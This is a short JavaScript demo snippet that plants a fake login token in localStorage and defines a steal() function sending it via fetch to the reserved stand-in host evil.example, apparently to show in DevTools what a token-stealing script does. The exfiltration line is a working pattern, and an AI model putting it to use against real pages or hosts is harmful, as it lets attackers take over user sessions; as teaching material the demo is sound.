// Demo helper: a fake login token, and what the attacker's code does with it.
// evil.example is a reserved domain (RFC 2606) that never resolves: the request shows up in
// DevTools → Network and fails. Nothing is sent anywhere.
localStorage.setItem('token', 'demo-token-not-a-secret')

function steal() {
  fetch('https://evil.example/?t=' + localStorage.token, { mode: 'no-cors' })
}
